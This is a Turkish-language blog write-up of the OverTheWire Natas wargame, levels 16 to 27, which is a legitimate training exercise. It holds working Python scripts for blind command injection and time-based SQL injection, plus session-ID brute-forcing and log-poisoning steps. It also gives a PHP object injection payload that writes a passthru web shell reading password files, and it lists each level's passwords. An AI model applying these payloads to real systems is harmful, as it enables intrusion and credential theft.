---
layout: post
title: "OverTheWire:Natas Solutions 16-27"
date: 2018-06-28
excerpt: "28 Jun 2018"
comments: false
---
#### Level 16

For security reasons, we now filter even more on certain characters.


<figure>
<img src="/assets/img/natas/level165.png">
</figure>

Level 10'a çok benzemekle birlikte, extra olarak; istemciden alınan değer çift tırnaklar içerisinde passhtru fonksiyonunun içerisine yerleştirilmiş.Yani Level 10'daki gibi `a /etc/natas_webpass/natas11 #` bir payload girmem durumunda,

grep -i "a /etc/natas_webpass/natas11 #" dictionary.txt şeklinde bir komut çalışacak ve dictionary.txt dosyasında bu payloadın geçtiği satırları getiricek. Dolayısıyla çıktı vermeyecek.  

Bu durumu bypass edebilmek için "command substition"  denilen şeyi yapacağız.

``` 
Command Substition

  Bir komutun çıktısını, bir değişkende saklama veya başka bir komut içinde kullanma manasına gelir.Basit bir örnekle;
  
  cur_dir=$(pwd)
  echo $cur_dir
  
  Bunu yapabilmenin iki yolu var.
  Backtick karakter " ` " veya $() kullanmak.
  
```
Burada backtick karakteri filtrelenmiş olduğu için ikinci yolu kullanacağız.

Payload olarak $(cat /etc/natas_webpass/natas17) girdiğimizde bu komutun çıktısı passthru fonksiyonun içerisine yerleştirilecek, daha sonrasında dictionary.txt dosyasında bu satır aranacak. Dolayısıyla  böyle bir kullanımdan ziyade passhtru içerisindeki grep komutunu manipüle etmemiz, true-false mantığıyla veriyi inşaa etmemiz gerekiyor. 

"Hacker" kelimesi ile arama yaptığımızda  çıktı bu şekilde.
<figure>
<img src="/assets/img/natas/natas162.png">
</figure>

"Hacker$(grep ^a /etc/natas_webpass/natas17)"  şeklinde bir input girdiğimde çıktı yine aynı.

```
"grep ^a /etc/natas_webpass/natas17" ifadesi /etc/natas_webpass/natas17 dosyasından a harfi ile başlayan satırları getir anlamına geliyor.
```

Demek ki parola a harfi ile başlamıyor, yani grep ^a /etc/natas_webpass/natas17 komutunun çıktısı yok. Eğer ki a harfi ile başlasaydı bu komutun çıktısı natas17'ye ait parola olacaktı.Dolayısıyla ;

grep -i " " dictionary.txt ifadesinde çift tırnaklar arasına natas17'e ait parola gelicekti ve dictionary.txt dosyasında böyle bir satır olmadığı için çıktı boş olucaktı.

Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
        for char in chars:
                s=requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=hacker$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)',auth=auth)
                if "hacker" not in s.text:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### Level 17

Level 15'in devamı niteliğinde.

<figure>
<img src="/assets/img/natas/natas171.png">
</figure>

Çıktı veren kısımlar yorum satırı haline getirilmiş. Time Based SQL Injection ile parolayı elde etmeyi deniyoruz.

natas18 " and password LIKE BINARY "a%" and sleep(3) şeklinde bir payload girdiğimde natas18 kullanıcısına ait parolanın a ile başlaması halinde 3 saniyelik bir bekleme olucak.

Benzer bir script çalıştırıyoruz.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
       for char in chars:
               payload = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(3) \x23'}
               s=requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload,auth=auth)
               time=s.elapsed.total_seconds()
               if time>1:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### Level 18

<figure>
<img src="/assets/img/natas/natas181.png">
</figure>

<figure>
<img src="/assets/img/natas/natas182.png">
</figure>

Cookie başlığında  PHPSESSID değeri varsa , session başlatılıyor. Ardından print_credentials fonksiyonu çağrılıyor. Eğer SESSION içerisinde ki admin değeri 1' eşitse level 19'a ait parola ekrana bastırılıyor.Giden istekte PHPSESSID değeri yok ise, yeni bir session yaratılıyor.

Bu kısımda createID adında bir fonksiyon çağırılmış.
{% highlight php %}
<?
function createID($user) { 
    global $maxid; 
    return rand(1, $maxid); 
}
?>
{% endhighlight %}

Fonksiyon session_id olarak 1 ile maxid değeri arasında random bir değer döndürüyor. 


<figure>
<img src="/assets/img/natas/natas183.png">
</figure>

Değer 640 olarak tanımlanırken, "640 should be enough for everyone" şeklinde bir not düşülmüş. Burdan anlıyoruz ki admin dahil tüm kullanıcılar için session_id değeri 1 ile 640 arasında.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
for id in range(1,640):
               payload = {"username": "aa", "password": "aa"}
               id=str(id)
               cookie={'PHPSESSID':''+id+''}
               s=requests.post('http://natas18.natas.labs.overthewire.org/index.php',auth=auth,data=payload,cookies=cookie)
               if "You are an admin" in s.text:
                        print id
                        print s.text
                        break

{% endhighlight %}

>> natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

#### Level 19

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Diğer sayfadan farklı olarak session id'lerin sıralı olmadığını söylenmiş. Burp ile birkaç farklı username:password ile istekte bulunuyorum.

<figure>
<img src="/assets/img/natas/natas191.png">
</figure>
<figure>
<img src="/assets/img/natas/natas192.png">
</figure>
<figure>
<img src="/assets/img/natas/natas193.png">
</figure>
<figure>
<img src="/assets/img/natas/haha.png">
</figure>
<figure>
<img src="/assets/img/natas/natas195.png">
</figure>
<figure>
<img src="/assets/img/natas/natas196.png">
</figure>

Tüm sessionlarda ortak olan 2d ifadesi. Bununla birlikte  0-9 arasında rakamlar , a-f ile arasında karakterler kullanılmış. Session id hex formatında olabilir. Dönüştürmeyi denediğimizde ;


   user:pass |            hex          | ascii
-------------|-------------------------|---------------
burcu:123456 |33382d6275726375         |38-burcu
-------------|-------------------------|----------------
admin:admin  |3233342d61646d696e       |234-admin
-------------|-------------------------|----------------
a:           |3239312d61               |291-a


"-" karakterinden öncesi muhtemelen bir önceki soruda verildiği gibi 1,640 arasında random olarak üretiliyor.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
for id in range(650):
               sessid=''+str(id)+'-admin'
               sessid=sessid.encode("hex")
               cookie={'PHPSESSID':''+sessid+''}
               s=requests.get('http://natas19.natas.labs.overthewire.org',auth=auth,cookies=cookie)
               if "You are an admin"  in s.text:
                        print s.text
                        break

{% endhighlight %}

>> natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

#### Level 20

<figure>
<img src="/assets/img/natas/natas2020.png">
</figure>

<figure>
<img src="/assets/img/natas/natas201.png">
</figure>

Yapmamız gereken SESSION değişkeni içerisindeki admin keyinin değerini 1' eşitlemek.

<figure>
<img src="/assets/img/natas/natas202.png">
</figure>

```
session_set_save_handler() fonksiyonu , bir oturum ile  alakalı verileri almak ve saklamak için oturum başlatılmasından, oturum sonlandırılmasına kadar ki tüm olaylarda tetiklenecek fonksiyonları belirtir. Sırası ile open(),read(),write() fonksiyonları çalıştırılır.

```

{% highlight php %}

<?
function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
} 
?>
{% endhighlight %}

Bu fonksiyonla birlikte session bilgileri bir dosyaya yazılıyor.SESSION değişkeni içerisindeki değerler key=>value çifleri olarak ayrılıp her biri data değişkenine ardından da session bilgilerinin tutulduğu dosyaya "key value \n" şeklinde yazılıyor. Yani;

 ````
 $_SESSION["login"] = "true";
 $_SESSION["user"] = "admin";
 $_SESSION["pass"] = "123456";
 ```` 
 bu sessiona ait dosyanın son hali;
 
 ````
 login true
 user admin
 pass 123456 
````
olacaktır.

{% highlight php %}

<?
function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 
?>
{% endhighlight %}

myread fonksiyonunda mywrite fonksiyonu ile dosyaya yazılmış session bilgileri okunuyor.Format şu şekilde;

data değişkenine alınan dosya içeriği "\n" belirteci  , ardından da " " ile  ayrılıyor ve  session  değişkeni içerisine kaydediliyor.Yani ;

İçeriği

````
login true
user guess
pass guess 
````
olan bir dosya session değişkenine  bu şekilde kaydolacaktır.

````
$_SESSION["login"]="true";
$_SESSION["user"]="guess";
$_SESSION["pass"]="guess";  
````


Bizim girdiğimiz input da SESSION değişkeni içerisinde name keyine atanıyor.Girdiğimiz name ile birlikte \nadmin 1 şeklinde bir key:value çifti girersek dosyanın en son hali şu şekilde olucak;

name burcu \nadmin 1.

\n ve " " belirteçleri ile ayrıldıktan sonra, $_SESSION["name"]="burcu",$_SESSION["admin"]="1" olarak SESSION değişkenine kaydedilecek.

<figure>
<img src="/assets/img/natas/natas204.png">
</figure>

<figure>
<img src="/assets/img/natas/natas205.png">
</figure>


>>natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ

#### Level 21

<figure>
<img src="/assets/img/natas/natas211.png">
</figure>

<figure>
<img src="/assets/img/natas/natas212.png">
</figure>

Level 22'ye ait parolayı öğrenebilmek için admin keyinin değerini 1 yapmamız gerekiyor.

http://natas21-experimenter.natas.labs.overthewire.org sayfasına gidiyoruz.

<figure>
<img src="/assets/img/natas/natas213.png">
</figure>

<figure>
<img src="/assets/img/natas/natas214.png">
</figure>

Giden istekteki değişken ve değerleri session değişkeni içerisine key:value çiftleri olarak atanıyor.İsteğe admin değişkenini ekliyoruz.

<figure>
<img src="/assets/img/natas/natas215.png">
</figure>

<figure>
<img src="/assets/img/natas/natas216.png">
</figure>

Bu sayfada, session değişkeni içerisinde ki admin keyinin değerini 1 yaptık. 

Note: this website is colocated with http://natas21.natas.labs.overthewire.org mesajından anlıyoruz ki sessionlar iki domain arasında  paylaşılıyor. Buradaki PHPSESSID değerini ana sayfada kullanıyoruz.

<figure>
<img src="/assets/img/natas/natas217.png">
</figure>

<figure>
<img src="/assets/img/natas/natas219.png">
</figure>

>> natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

#### Level 22

<figure>
<img src="/assets/img/natas/natas221.png">
</figure>

<figure>
<img src="/assets/img/natas/natas222.png">
</figure>

<figure>
<img src="/assets/img/natas/natas223.png">
</figure>

>> natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

#### Level 23

<figure>
<img src="/assets/img/natas/natas231.png">
</figure>

<figure>
<img src="/assets/img/natas/natas238.png">
</figure>

````
Strstr fonksiyonu bir string içerisinde bir karakter veya karakter grubu arar.Aranan karakter dizisi bulunamazsa false, bulunursa stringin ilk veya son bölümünü döner.
    echo strstr("Hello world!", "w");
        world!
````

Yani girdiğimiz parola içerisinde "iloveyou" stringini barındırmalı ve bununla birlikte tamsayı değeri 10'dan büyük olmalı.

<figure>
<img src="/assets/img/natas/natas233.png">
</figure>

````
intval fonksiyonu değişkenin tamsayı değerini döndürür.
````

>> natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg

#### Level 24

<figure>
<img src="/assets/img/natas/natas241.png">
</figure>

<figure>
<img src="/assets/img/natas/natas242.png">
</figure>

strcmp fonksiyonunun nasıl çalıştığına bakalım.

```
int strcmp ( string $d1 , string $d2 )
    if $d1>$d2
        return 1;
    if $d1<$d2
        return -1;
    if $d1==d2
        return 0;
  Bu durumlar dışında, fonksiyona verilen parametrelerden birisi string değilse fonksiyon yine 0 döndürür.
  
  ```
  Bizde string göndermek yerine bir array göndereceğiz.
  
<figure>
<img src="/assets/img/natas/natas243.png">
</figure>

<figure>
<img src="/assets/img/natas/natas244.png">
</figure>

>> natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c

#### Level 25
  
<figure>
<img src="/assets/img/natas/natas252.png">
</figure>

Seçtiğimiz dile göre o dile ait sayfa include ediliyor.

<figure>
<img src="/assets/img/natas/natas251.png">
</figure>


{% highlight php %}

<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

?>
{% endhighlight %}

İlk başta setLanguage fonksiyonu çağırılıyor. Include edilecek sayfanın pathi safeinclude fonksiyonuna gönderilmiş.

Fonksiyonda directory traversal ataklarına karşı bazı önlemler alınmış. Girilen inputta "../" ifadesi bulunması halinde  bu ifadeler replace edilmiş.Bununla birlikte logReuest fonksiyonu çağırılarak log tutulmuş.

strstr fonksiyonunu şu şekilde bypass edebiliriz.

<figure>
<img src="/assets/img/natas/natas253.png">
</figure>

Fakat hemen ardından "natas_webpass" stringi de filtrelenmiş.Yani bu dosyayı çağırabilmemiz mümkün değil.

<figure>
<img src="/assets/img/natas/natas253.png">
</figure>

<figure>
<img src="/assets/img/natas/natas254.png">
</figure>

<figure>
<img src="/assets/img/natas/natas255.png">
</figure>

Log dosyasını okuyabildik, log dosyasına user-agent bilgisi de eklenmiş.

User-agent injection atak yaparak, yazdığımız kodun çıktısını log dosyasında göreceğiz.

<figure>
<img src="/assets/img/natas/natas256.png">
</figure>

<figure>
<img src="/assets/img/natas/natas257.png">
</figure>

>>natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

#### Level 26


<figure>
<img src="/assets/img/natas/natas261.png">
</figure>

Bu bölümde PHP Object Injection atak gerçekleştirerek level 27' ye ait parolayı öğreneceğiz.


````
Bu zafiyetin oluşabilmesi ve exploit edilebilmesi için;
    -Kullanıcıdan alınan inputun unserialize methoduna gönderilmesi
    -Yazılım genelinde herhangi bir sınıfın --destruct methodunun bulunması
    -Destruct methodunun, ait olduğu classın sınıf değişkenlerini herhangi bir nedenle yerel diske kayıt ediyor olması
    -Bu kayıt edilen dosyanın bulunduğu dizinin web üzerinden erişilebilir olması
                    
````

Daha detaylı bir bilgi için: <a href="https://www.mehmetince.net/php-object-injection-saldirilari-ve-korunmasi/">

Kullanıcıdan alınan cookie değeri unserialize metoduna veriliyor.
<figure>
<img src="/assets/img/natas/natas262.png">
</figure>
Logger sınıfının destruct methodu mevcut ve değişkenler bir dosyaya kaydediliyor.
<figure>
<img src="/assets/img/natas/natas263.png">
</figure>

Exploiti için;

{% highlight php %}
 <?php
   
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="<? passthru(' cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<? passthru(' cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/burju.php";
      
        }                       
      
        function log($msg){
            ;
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
    
   $obj=new Logger("aa");
   echo urlencode(base64_encode(serialize($obj)));
   
?>

{% endhighlight %}

şeklinde malformed class oluşturuyoruz.Scriptin çalıştırılması sonucu;

"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2J1cmp1LnBocCI7czoxNToiAExvZ2dlc
gBpbml0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7czoxN
ToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA
%2FPiI7fQ%3D%3D" değerini elde ediyoruz.
 
 <figure>
<img src="/assets/img/natas/natas269.png">
</figure>
<figure>
<img src="/assets/img/natas/natas268.png">
</figure>

img/burju.php adresine gidiyoruz.

>> natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

#### Level 27 

<figure>
<img src="/assets/img/natas/natas271.png">
</figure>


{% highlight php %}

 <? 

// morla / 10111 
// database gets cleared every 5 min  


/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 


function checkCredentials($link,$usr,$pass){ 
  
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "SELECT username from users where username='$user' and password='$password' "; 
    $res = mysql_query($query, $link); 
    if(mysql_num_rows($res) > 0){ 
        return True; 
    } 
    return False; 
} 


function validUser($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            return True; 
        } 
    } 
    return False; 
 } 


function dumpData($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) { 
                // thanks to Gobo for reporting this bug!   
                //return print_r($row); 
                return print_r($row,true); 
            } 
        } 
    } 
    return False; 
} 


function createUser($link, $usr, $pass){ 

    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "INSERT INTO users (username,password) values ('$user','$password')"; 
    $res = mysql_query($query, $link); 
    if(mysql_affected_rows() > 0){ 
        return True; 
    } 
    return False; 
} 

 ?>


{% endhighlight %}

SQli ataklarına karşı mysql_real_escape_string fonksiyonu ile önlem alınmış. Her ne kadar bypass etmeye çalışsamda başarılı olamadım.

    ````
    mysql_real_escape_string fonksiyonu  stringler içerisindeki özel karakterlerin başına escape karakteri koyar, kulanıcıdan alınan parametre direk sql sorgusuna yerleştirilmeden önce bu fonksiyondan geçirilir.
    
    ````
    
    
Bize lazım olan natas28 kullanıcına ait parola.

<figure>
<img src="/assets/img/natas/natas273.png">
</figure>

 dumpData fonksiyonu parametre olarak yalnızca username alıyor. Yani sistemde parolasını bildiğimiz bir natas28 kullancısı oluşturabilmemiz dahilinde asıl natas28 kullanıcısının parolasını öğrenebileceğiz.
 
 <figure>
<img src="/assets/img/natas/natas274.png">
</figure>

User ve pass için max 64 char boyutunda yer ayrılmış. natas28+" ".57+A şeklinde bir username girdiğimizde , önce validUser fonksiyonu çağrılacak.Böyle bir kullanıcı olmadığı için false dönecek. Bu sebepten ötürü createUser fonksiyonu çağrılacak. Max 64 char boyutunda yer ayrıldığı için 64 karaktersen sonrası kesilecek. Yani A harfi. Geriye natas28+" ".57 kalmış olucak.Boşluklar temizlendiği için, sisteme parolasını bildiğimiz bir natas28 kullanıcısı eklemiş olacağız.

 <figure>
<img src="/assets/img/natas/natas275.png">
</figure>

 <figure>
<img src="/assets/img/natas/natas276.png">
</figure>

 <figure>
<img src="/assets/img/natas/natas277.png">
</figure>

 <figure>
<img src="/assets/img/natas/natas278.png">
</figure>

>> natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF
